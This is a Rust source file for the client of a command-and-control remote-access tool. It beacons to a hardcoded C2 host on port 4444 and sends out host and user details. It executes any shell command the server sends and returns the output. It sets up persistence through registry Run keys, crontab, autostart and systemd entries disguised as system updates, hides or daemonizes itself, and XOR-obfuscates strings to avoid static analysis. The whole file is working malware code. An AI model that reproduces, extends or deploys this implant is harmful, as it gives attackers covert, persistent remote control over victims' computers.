use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use uuid::Uuid;
use chrono::{DateTime, Utc};
use rsa::RsaPublicKey;

/// Client configuration
#[derive(Debug, Clone)]
pub struct ClientConfig {
    pub server_address: String,
    pub server_port: u16,
    pub reconnect_delay: u64,      // seconds
    pub heartbeat_interval: u64,   // seconds
    pub command_poll_interval: u64, // seconds
    pub max_reconnect_attempts: u32,
    pub persistence_enabled: bool,
    pub stealth_mode: bool,
}

impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            server_address: "c2.on3day.me".to_string(), // Default server IP
            server_port: 4444,
            reconnect_delay: 30,
            heartbeat_interval: 60,
            command_poll_interval: 5,
            max_reconnect_attempts: 0, // 0 = infinite
            persistence_enabled: true,
            stealth_mode: true,
        }
    }
}

/// Client information sent during handshake
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientHandshakeInfo {
    pub hostname: String,
    pub username: String,
    pub operating_system: String,
    pub client_version: String,
}

/// Command to be executed
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub id: String,
    pub command: String,
    pub timestamp: DateTime<Utc>,
    pub executed: bool,
}

/// Command result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResult {
    pub command_id: String,
    pub output: String,
    pub error: Option<String>,
    pub timestamp: DateTime<Utc>,
}

/// Message types for client-server communication
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum MessageType {
    // Initial handshake
    #[serde(rename = "handshake_request")]
    HandshakeRequest {
        client_info: ClientHandshakeInfo,
    },
    #[serde(rename = "handshake_response")]
    HandshakeResponse {
        public_key_pem: String,
        server_id: String,
    },
    #[serde(rename = "session_key")]
    SessionKey {
        encrypted_aes_key: String, // RSA encrypted AES key (base64)
    },
    #[serde(rename = "session_ack")]
    SessionAck {
        status: String,
    },
    
    // Regular communication (encrypted)
    #[serde(rename = "heartbeat")]
    Heartbeat {
        timestamp: DateTime<Utc>,
    },
    #[serde(rename = "heartbeat_ack")]
    HeartbeatAck {
        timestamp: DateTime<Utc>,
    },
    #[serde(rename = "command_request")]
    CommandRequest {},
    #[serde(rename = "command_response")]
    CommandResponse {
        command: Option<Command>,
    },
    #[serde(rename = "command_result")]
    CommandResult {
        result: CommandResult,
    },
    #[serde(rename = "command_ack")]
    CommandAck {
        command_id: String,
    },
}

/// Encrypted message wrapper
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedMessage {
    pub encrypted_data: String, // base64 encoded encrypted JSON
    pub nonce: String,          // base64 encoded nonce
}

/// Client state
#[derive(Debug)]
pub struct ClientState {
    pub config: ClientConfig,
    pub client_id: Option<String>,
    pub session_key: Option<[u8; 32]>,
    pub server_public_key: Option<RsaPublicKey>,
    pub is_connected: bool,
    pub reconnect_count: u32,
}

impl ClientState {
    pub fn new(config: ClientConfig) -> Self {
        Self {
            config,
            client_id: None,
            session_key: None,
            server_public_key: None,
            is_connected: false,
            reconnect_count: 0,
        }
    }
    
    pub fn reset_connection(&mut self) {
        self.session_key = None;
        self.server_public_key = None;
        self.is_connected = false;
    }
}

/// Utility functions for encryption/decryption (same as server)
pub mod crypto {
    use super::*;
    use aes_gcm::{
        aead::{Aead, KeyInit, generic_array::GenericArray},
        Aes256Gcm, Nonce,
    };
    use rsa::{Pkcs1v15Encrypt, RsaPublicKey, pkcs8::DecodePublicKey};
    use rand::rngs::OsRng;
    
    /// Generate a random AES-256 key
    pub fn generate_aes_key() -> [u8; 32] {
        use rand::RngCore;
        let mut key = [0u8; 32];
        OsRng.fill_bytes(&mut key);
        key
    }
    
    /// Encrypt data with AES-256-GCM
    pub fn encrypt_aes(data: &[u8], key: &[u8; 32]) -> Result<EncryptedMessage> {
        let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
        
        // Generate random nonce
        let mut nonce_bytes = [0u8; 12];
        use rand::RngCore;
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let ciphertext = cipher.encrypt(nonce, data)
            .map_err(|e| anyhow::anyhow!("AES encryption failed: {}", e))?;
        
        Ok(EncryptedMessage {
            encrypted_data: general_purpose::STANDARD.encode(&ciphertext),
            nonce: general_purpose::STANDARD.encode(&nonce_bytes),
        })
    }
    
    /// Decrypt data with AES-256-GCM
    pub fn decrypt_aes(encrypted_msg: &EncryptedMessage, key: &[u8; 32]) -> Result<Vec<u8>> {
        let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
        
        let ciphertext = general_purpose::STANDARD.decode(&encrypted_msg.encrypted_data)?;
        let nonce_bytes = general_purpose::STANDARD.decode(&encrypted_msg.nonce)?;
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let plaintext = cipher.decrypt(nonce, ciphertext.as_ref())
            .map_err(|e| anyhow::anyhow!("AES decryption failed: {}", e))?;
        
        Ok(plaintext)
    }
    
    /// Encrypt data with RSA public key
    pub fn encrypt_rsa(data: &[u8], public_key: &RsaPublicKey) -> Result<Vec<u8>> {
        let mut rng = OsRng;
        let encrypted = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, data)
            .map_err(|e| anyhow::anyhow!("RSA encryption failed: {}", e))?;
        Ok(encrypted)
    }
    
    /// Parse RSA public key from PEM format
    pub fn public_key_from_pem(pem: &str) -> Result<RsaPublicKey> {
        let public_key = RsaPublicKey::from_public_key_pem(pem)
            .map_err(|e| anyhow::anyhow!("Failed to parse public key: {}", e))?;
        Ok(public_key)
    }
}

/// Platform-specific utilities
pub mod platform {
    use super::*;
    
    /// Get client information for handshake
    pub fn get_client_info() -> ClientHandshakeInfo {
        ClientHandshakeInfo {
            hostname: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
            username: obfuscate_username(&whoami::username()),
            operating_system: get_os_info(),
            client_version: "1.0.0".to_string(),
        }
    }
    
    /// Get detailed OS information
    fn get_os_info() -> String {
        #[cfg(windows)]
        {
            format!("Windows {}", whoami::platform())
        }
        #[cfg(unix)]
        {
            format!("{} {}", whoami::platform(), whoami::distro())
        }
        #[cfg(not(any(windows, unix)))]
        {
            whoami::platform().to_string()
        }
    }
    
    /// Setup persistence (auto-start)
    pub fn setup_persistence(config: &ClientConfig) -> Result<()> {
        if !config.persistence_enabled {
            return Ok(());
        }
        
        #[cfg(windows)]
        {
            setup_windows_persistence()
        }
        #[cfg(unix)]
        {
            setup_unix_persistence()
        }
        #[cfg(not(any(windows, unix)))]
        {
            Ok(()) // No persistence on other platforms
        }
    }
    
    #[cfg(windows)]
    fn setup_windows_persistence() -> Result<()> {
        use winreg::enums::*;
        use winreg::RegKey;
        use std::env;
        
        let exe_path = env::current_exe()?;
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        
        // Try multiple persistence methods
        let persistence_keys = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ];
        
        for key_path in &persistence_keys {
            if let Ok((key, _)) = hkcu.create_subkey(key_path) {
                let app_name = "WindowsSecurityUpdate";
                if key.set_value(app_name, &exe_path.to_str().unwrap_or_default()).is_ok() {
                    return Ok(());
                }
            }
        }
        
        Err(anyhow::anyhow!("Failed to setup Windows persistence"))
    }
    
    #[cfg(unix)]
    fn setup_unix_persistence() -> Result<()> {
        use std::fs;
        use std::env;
        use std::os::unix::fs::PermissionsExt;
        
        let exe_path = env::current_exe()?;
        let home_dir = env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        
        // Create autostart desktop entry (Linux)
        let autostart_dir = format!("{}/.config/autostart", home_dir);
        if fs::create_dir_all(&autostart_dir).is_ok() {
            let desktop_content = format!(
                "[Desktop Entry]\nType=Application\nName=System Update\nExec={}\nHidden=false\nX-GNOME-Autostart-enabled=true\n",
                exe_path.display()
            );
            
            let desktop_file = format!("{}/system-update.desktop", autostart_dir);
            if fs::write(&desktop_file, desktop_content).is_ok() {
                return Ok(());
            }
        }
        
        // Try crontab method
        let cron_entry = format!("@reboot {}\n", exe_path.display());
        if std::process::Command::new("sh")
            .arg("-c")
            .arg(&format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_entry))
            .status().is_ok() {
            return Ok(());
        }
        
        // Try systemd user service (Linux)
        let systemd_user_dir = format!("{}/.config/systemd/user", home_dir);
        if fs::create_dir_all(&systemd_user_dir).is_ok() {
            let service_content = format!(
                "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart={}\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
                exe_path.display()
            );
            
            let service_file = format!("{}/system-update.service", systemd_user_dir);
            if fs::write(&service_file, service_content).is_ok() {
                // Enable the service
                let _ = std::process::Command::new("systemctl")
                    .args(&["--user", "enable", "system-update.service"])
                    .status();
                return Ok(());
            }
        }
        
        Ok(()) // Don't fail if persistence setup fails
    }
    
    /// Execute shell command and return output
    pub async fn execute_command(command: &str) -> CommandResult {
        let command_id = Uuid::new_v4().to_string();
        let timestamp = Utc::now();
        
        #[cfg(windows)]
        let (shell, shell_arg) = ("cmd", "/C");
        #[cfg(unix)]
        let (shell, shell_arg) = ("sh", "-c");
        
        match tokio::process::Command::new(shell)
            .arg(shell_arg)
            .arg(command)
            .output()
            .await
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                
                let mut result_output = stdout.to_string();
                if !stderr.is_empty() {
                    result_output.push_str("\n--- STDERR ---\n");
                    result_output.push_str(&stderr);
                }
                
                CommandResult {
                    command_id,
                    output: result_output,
                    error: if output.status.success() { None } else { Some(format!("Exit code: {}", output.status)) },
                    timestamp,
                }
            }
            Err(e) => CommandResult {
                command_id,
                output: String::new(),
                error: Some(format!("Failed to execute command: {}", e)),
                timestamp,
            },
        }
    }
    
    /// Hide the current process (Windows)
    #[cfg(windows)]
    pub fn hide_process() -> Result<()> {
        use winapi::um::winuser::{ShowWindow, SW_HIDE};
        use winapi::um::wincon::GetConsoleWindow;
        
        unsafe {
            let console_window = GetConsoleWindow();
            if !console_window.is_null() {
                ShowWindow(console_window, SW_HIDE);
            }
        }
        
        Ok(())
    }
    
    /// Daemonize the process (Unix)
    #[cfg(unix)]
    pub fn daemonize() -> Result<()> {
        use nix::unistd::{fork, setsid, ForkResult};
        use std::process;
        
        // First fork
        match unsafe { fork() } {
            Ok(ForkResult::Parent { .. }) => process::exit(0),
            Ok(ForkResult::Child) => {},
            Err(e) => return Err(anyhow::anyhow!("First fork failed: {}", e)),
        }
        
        // Create new session
        setsid().map_err(|e| anyhow::anyhow!("setsid failed: {}", e))?;
        
        // Second fork
        match unsafe { fork() } {
            Ok(ForkResult::Parent { .. }) => process::exit(0),
            Ok(ForkResult::Child) => {},
            Err(e) => return Err(anyhow::anyhow!("Second fork failed: {}", e)),
        }
        
        Ok(())
    }
    
    /// Run in background mode
    pub fn run_in_background() -> Result<()> {
        #[cfg(windows)]
        {
            hide_process()
        }
        #[cfg(unix)]
        {
            daemonize()
        }
        #[cfg(not(any(windows, unix)))]
        {
            Ok(())
        }
    }
}

/// Simple string obfuscation/deobfuscation to avoid static analysis.
/// This is its own inverse.
pub fn xor_string(s: &str) -> String {
    // Simple XOR with rotating key
    let key = b"xYz9!@#$";
    s.bytes()
        .enumerate()
        .map(|(i, b)| (b ^ key[i % key.len()]) as char)
        .collect()
}

/// Obfuscate username to avoid detection
pub fn obfuscate_username(username: &str) -> String {
    if username.len() > 3 {
        format!("{}***", &username[..2])
    } else {
        "usr***".to_string()
    }
}

/// Network utilities
pub mod network {
    use super::*;
    use tokio::net::TcpStream;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use std::time::Duration;
    
    /// Connect to server with timeout
    pub async fn connect_to_server(address: &str, port: u16, timeout_secs: u64) -> Result<TcpStream> {
        let addr = format!("{}:{}", address, port);
        println!("[DEBUG] Attempting to connect to: {}", addr);
        
        let stream = tokio::time::timeout(
            Duration::from_secs(timeout_secs),
            TcpStream::connect(&addr)
        ).await;
        
        match stream {
            Ok(Ok(stream)) => {
                println!("[DEBUG] Successfully connected to {}", addr);
                Ok(stream)
            }
            Ok(Err(e)) => {
                eprintln!("[ERROR] Failed to connect to {}: {}", addr, e);
                Err(anyhow::anyhow!("Connection failed: {}", e))
            }
            Err(_) => {
                eprintln!("[ERROR] Connection to {} timed out after {} seconds", addr, timeout_secs);
                Err(anyhow::anyhow!("Connection timeout"))
            }
        }
    }
    
    /// Send message to server with length header
    pub async fn send_message(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
        // Send 4-byte length header followed by data
        let length = data.len() as u32;
        stream.write_all(&length.to_be_bytes()).await?;
        stream.write_all(data).await?;
        stream.flush().await?;
        Ok(())
    }
    
    /// Receive message from server with timeout and length header
    pub async fn receive_message(stream: &mut TcpStream, timeout_secs: u64) -> Result<Vec<u8>> {
        // First read the 4-byte length header
        let mut length_buf = [0u8; 4];
        tokio::time::timeout(
            Duration::from_secs(timeout_secs),
            stream.read_exact(&mut length_buf)
        ).await??;
        
        let message_length = u32::from_be_bytes(length_buf) as usize;
        
        // Validate message length (max 1MB to prevent memory exhaustion)
        if message_length > 1024 * 1024 {
            return Err(anyhow::anyhow!("Message too large: {} bytes", message_length));
        }
        
        // Read the actual message
        let mut buffer = vec![0u8; message_length];
        tokio::time::timeout(
            Duration::from_secs(timeout_secs),
            stream.read_exact(&mut buffer)
        ).await??;
        
        Ok(buffer)
    }
    
    /// Send encrypted message
    pub async fn send_encrypted_message(
        stream: &mut TcpStream,
        message: &MessageType,
        session_key: &[u8; 32]
    ) -> Result<()> {
        let message_data = serde_json::to_vec(message)?;
        let encrypted_message = crypto::encrypt_aes(&message_data, session_key)?;
        let encrypted_data = serde_json::to_vec(&encrypted_message)?;
        send_message(stream, &encrypted_data).await
    }
    
    /// Receive and decrypt message
    pub async fn receive_encrypted_message(
        stream: &mut TcpStream,
        session_key: &[u8; 32],
        timeout_secs: u64
    ) -> Result<MessageType> {
        let data = receive_message(stream, timeout_secs).await?;
        let encrypted_message: EncryptedMessage = serde_json::from_slice(&data)?;
        let decrypted_data = crypto::decrypt_aes(&encrypted_message, session_key)?;
        let message: MessageType = serde_json::from_slice(&decrypted_data)?;
        Ok(message)
    }
}
